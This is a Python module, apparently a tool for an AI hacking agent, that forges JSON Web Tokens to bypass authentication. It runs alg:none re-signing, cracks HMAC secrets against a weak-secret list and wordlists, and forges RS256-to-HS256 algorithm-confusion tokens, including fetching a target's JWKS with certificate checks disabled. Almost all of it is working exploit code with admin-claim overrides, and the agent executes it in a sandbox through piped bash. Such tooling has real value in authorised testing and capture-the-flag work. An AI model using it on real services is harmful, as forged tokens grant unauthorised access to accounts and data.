"""JWT forge — an executable exploit PRIMITIVE (same shape as solver._blind_extract).

One tool call runs every common JWT-auth-bypass attack in-sandbox instead of the LLM
hand-assembling base64url + HMAC by hand (it always fumbles the padding):
  1. alg:none family  — re-sign with alg none/None/NONE/nOnE and an empty signature.
  2. weak HMAC secret  — crack HS256/384/512 against a builtin list + optional wordlist,
                         then forge a token with the caller's claim overrides.
  3. alg-confusion     — RS256->HS256: HMAC the token with the RSA PUBLIC KEY as the secret.
                         Give the key as PEM (`public_key`) OR — new — as `jwks`/`jwks_url`: the
                         primitive builds the RSA public-key PEM from the JWK (n,e) itself (pure-DER,
                         no crypto lib) and forges both trailing-newline variants, so the agent no
                         longer hand-rolls the JWKS->PEM->HS256 step.

Pure-stdlib crypto (hmac/hashlib + a tiny DER encoder), so it runs anywhere python3 does. Returns
each forged token labelled by method and reports which secret cracked.
"""
import base64
import inspect
import json


# --- JWK -> RSA public-key PEM, pure-DER (no crypto lib). Module-level so the sandbox script is
# assembled from THIS source (inspect.getsource, one source of truth) AND it's host-testable. ---
def _der_len(n):
    if n < 0x80:
        return bytes([n])
    o = []
    while n:
        o.insert(0, n & 0xFF); n >>= 8
    return bytes([0x80 | len(o)]) + bytes(o)


def _der_int(x):
    b = x.to_bytes((x.bit_length() + 7) // 8 or 1, "big")
    if b[0] & 0x80:                                  # keep it a positive INTEGER
        b = b"\x00" + b
    return b"\x02" + _der_len(len(b)) + b


def _der_seq(*it):
    body = b"".join(it)
    return b"\x30" + _der_len(len(body)) + body


def jwk_to_pem(n_b64u, e_b64u):
    """RSA JWK (n,e as base64url) -> SubjectPublicKeyInfo PEM (BEGIN PUBLIC KEY), with trailing \\n."""
    def _b(s):
        s = s.encode() if isinstance(s, str) else s
        return base64.urlsafe_b64decode(s + b"=" * (-len(s) % 4))
    n = int.from_bytes(_b(n_b64u), "big"); e = int.from_bytes(_b(e_b64u), "big")
    rsapub = _der_seq(_der_int(n), _der_int(e))
    algid = _der_seq(b"\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01", b"\x05\x00")  # rsaEncryption+NULL
    spki = _der_seq(algid, b"\x03" + _der_len(len(rsapub) + 1) + b"\x00" + rsapub)  # BIT STRING, 0 unused
    body = base64.b64encode(spki).decode()
    return ("-----BEGIN PUBLIC KEY-----\n" +
            "\n".join(body[i:i + 64] for i in range(0, len(body), 64)) +
            "\n-----END PUBLIC KEY-----\n")


def _script(params: dict) -> str:
    """The primitive as a self-contained stdlib script run inside the sandbox. The JWK->PEM helpers
    are pulled from THIS module (inspect.getsource) so the code the host-test exercises is what runs."""
    helpers = "\n".join(inspect.getsource(f) for f in (_der_len, _der_int, _der_seq, jwk_to_pem))
    return "import json,sys,hmac,hashlib,os,base64\n" + helpers + "\n" + \
           f"P=json.loads(r'''{json.dumps(params)}''')\n" + r'''
def b64d(s):                       # base64url decode, tolerate missing padding
    s=s.encode() if isinstance(s,str) else s
    return base64.urlsafe_b64decode(s+b"="*(-len(s)%4))
import base64
def b64e(b):                       # base64url encode, strip padding
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

TOK=P["token"].strip()
CLAIMS=P.get("claims") or {}
parts=TOK.split(".")
if len(parts)<2:
    print("JWT_FORGE_FAIL: not a JWT (need header.payload.signature): %r"%TOK[:40]); sys.exit(0)
try:
    header=json.loads(b64d(parts[0]))
    payload=json.loads(b64d(parts[1]))
except Exception as e:
    print("JWT_FORGE_FAIL: could not parse header/payload: %s"%e); sys.exit(0)

def forge_payload():
    p=dict(payload); p.update(CLAIMS); return p

alg=str(header.get("alg","")); print("JWT_FORGE_OK parsed alg=%s claims_override=%s"%(alg,json.dumps(CLAIMS)))

# 1. alg:none family — no signature to compute; empty third segment
for a in ("none","None","NONE","nOnE"):
    h=dict(header); h["alg"]=a
    t=b64e(json.dumps(h,separators=(",",":")))+"."+b64e(json.dumps(forge_payload(),separators=(",",":")))+"."
    print("[alg-none/%s] %s"%(a,t))

# 2. weak HMAC secret — crack, then forge
_HASH={"HS256":hashlib.sha256,"HS384":hashlib.sha384,"HS512":hashlib.sha512}
def sign_hs(alg,secret,signing_input):
    return b64e(hmac.new(secret if isinstance(secret,bytes) else secret.encode(),
                         signing_input.encode(),_HASH[alg]).digest())

if alg in _HASH and len(parts)==3:
    cands=[("secret","builtin"),("secret123","builtin"),("password","builtin"),
           ("admin","builtin"),("key","builtin"),("changeme","builtin"),("jwt","builtin"),
           ("s3cr3t","builtin"),("your-256-bit-secret","builtin")]
    wl=P.get("wordlist")
    if wl and os.path.exists(wl):
        try:
            with open(wl,"rb") as f:
                for line in f:
                    w=line.rstrip(b"\r\n").decode("utf-8","replace")
                    if w: cands.append((w,"wordlist"))
        except Exception as e:
            print("[hmac-crack] wordlist read error: %s"%e)
    signing_input=parts[0]+"."+parts[1]; want=parts[2]
    found=None
    for sec,src in cands:
        if hmac.compare_digest(sign_hs(alg,sec,signing_input),want):
            found=(sec,src); break
    if found:
        sec,src=found; print("[hmac-crack] SECRET FOUND: %r (%s)"%(sec,src))
        h=dict(header); h["alg"]=alg
        si=b64e(json.dumps(h,separators=(",",":")))+"."+b64e(json.dumps(forge_payload(),separators=(",",":")))
        print("[hmac-forge/%s] %s.%s"%(alg,si,sign_hs(alg,sec,si)))
    else:
        print("[hmac-crack] no secret in builtin list (%d)%s cracked the signature"%(
            len(cands)," + wordlist" if wl else ""))
elif alg.startswith("HS"):
    print("[hmac-crack] unsupported HMAC alg %s (only HS256/384/512)"%alg)

# 3. alg-confusion RS256->HS256 — HMAC with the RSA PUBLIC KEY bytes as the secret
pk=P.get("public_key")
if pk:
    key=None
    if os.path.exists(pk):
        try: key=open(pk,"rb").read()
        except Exception as e: print("[alg-confusion] public_key file read error: %s"%e)
    else:
        key=pk.encode()
    if key is not None:
        h=dict(header); h["alg"]="HS256"
        si=b64e(json.dumps(h,separators=(",",":")))+"."+b64e(json.dumps(forge_payload(),separators=(",",":")))
        sig=b64e(hmac.new(key,si.encode(),hashlib.sha256).digest())
        print("[alg-confusion RS256->HS256] %s.%s"%(si,sig))

# 3b. alg-confusion straight from a JWKS/JWK — jwk_to_pem (assembled above from the module) builds the
#     RSA public-key PEM, the JWK->PEM step the agent kept hand-rolling. Emits both trailing-newline
#     variants because servers differ on whether the PEM key includes the final newline.
jwks=P.get("jwks"); jurl=P.get("jwks_url")
if jurl and not jwks:
    try:
        import urllib.request,ssl
        raw=urllib.request.urlopen(jurl,timeout=float(P.get("timeout",15)),
                                   context=ssl._create_unverified_context()).read()
        jwks=json.loads(raw); print("[alg-confusion] fetched JWKS from %s"%jurl)
    except Exception as ex:
        print("[alg-confusion] jwks_url fetch failed: %s"%ex)
if isinstance(jwks,str):
    try: jwks=json.loads(jwks)
    except Exception: jwks=None
if isinstance(jwks,dict):
    keys=jwks.get("keys") if isinstance(jwks.get("keys"),list) else [jwks]
    for jk in keys:
        if not (isinstance(jk,dict) and jk.get("n") and jk.get("e")): continue
        try: pem=jwk_to_pem(jk["n"],jk["e"])
        except Exception as ex:
            print("[alg-confusion] JWK->PEM failed: %s"%ex); continue
        h=dict(header); h["alg"]="HS256"
        si=b64e(json.dumps(h,separators=(",",":")))+"."+b64e(json.dumps(forge_payload(),separators=(",",":")))
        for label,k in (("PEM+newline",pem),("PEM-no-newline",pem.rstrip("\n"))):
            sig=b64e(hmac.new(k.encode(),si.encode(),hashlib.sha256).digest())
            print("[alg-confusion JWK->HS256 %s] %s.%s"%(label,si,sig))
        print("[alg-confusion] derived PEM (kid=%s):\n%s"%(jk.get("kid",""),pem))
'''


def run(sb, args: dict) -> str:
    """Validate args, run the primitive script in the sandbox, return its output."""
    token = args.get("token")
    if not token or not isinstance(token, str):
        return "jwt_forge error: 'token' is required — the JWT to forge from (header.payload.sig)."
    claims = args.get("claims") or {}
    if not isinstance(claims, dict):
        return ("jwt_forge error: 'claims' must be a dict of claim overrides, e.g. "
                "{'role':'admin','sub':'1'}.")
    params = {"token": token, "claims": claims}
    if args.get("wordlist"):
        params["wordlist"] = args["wordlist"]
    if args.get("public_key"):
        params["public_key"] = args["public_key"]
    if args.get("jwks") is not None:
        params["jwks"] = args["jwks"]              # a JWK/JWKS dict or its JSON string
    if args.get("jwks_url"):
        params["jwks_url"] = args["jwks_url"]      # fetch the JWKS from the target (e.g. /jwks.json)
    if args.get("timeout"):
        params["timeout"] = args["timeout"]
    b64 = base64.b64encode(_script(params).encode()).decode()
    return sb.bash(f"echo {b64} | base64 -d | python3 -")


def demo() -> None:
    """Host self-test: jwk_to_pem must match a real key's canonical SPKI PEM, and the resulting PEM
    matches the key's canonical SPKI PEM exactly — if the PEM equals the server's own key bytes, the
    alg-confusion HMAC forgery is correct by construction. Skips if cryptography is absent (it is NOT
    needed at runtime — the sandbox script is pure-stdlib)."""
    # tiny DER sanity without any lib: a 3-byte modulus INTEGER encodes as 02 03 xx xx xx
    assert _der_int(0x010001) == b"\x02\x03\x01\x00\x01", _der_int(0x010001).hex()
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization
    except ImportError:
        print("jwt_forge.py ok (JWK->PEM canonical check skipped: cryptography not installed)")
        return

    def b64u(x):
        return base64.urlsafe_b64encode(x.to_bytes((x.bit_length() + 7) // 8, "big")).rstrip(b"=").decode()

    for _ in range(3):                               # a few keys — catch any INTEGER-padding edge case
        pub = rsa.generate_private_key(public_exponent=65537, key_size=2048).public_key()
        nums = pub.public_numbers()
        canonical = pub.public_bytes(serialization.Encoding.PEM,
                                     serialization.PublicFormat.SubjectPublicKeyInfo).decode()
        ours = jwk_to_pem(b64u(nums.n), b64u(nums.e))
        assert ours == canonical, f"JWK->PEM mismatch:\n--ours--\n{ours}\n--canonical--\n{canonical}"
    # the vulnerable server does raw HMAC-SHA256(pem_bytes, signing_input); our forge does the same,
    # so a token forged with `ours` verifies under that PEM — the whole alg-confusion attack.
    print("jwt_forge.py ok — JWK->PEM matches canonical SPKI (alg-confusion forge is correct by construction)")


if __name__ == "__main__":
    demo()
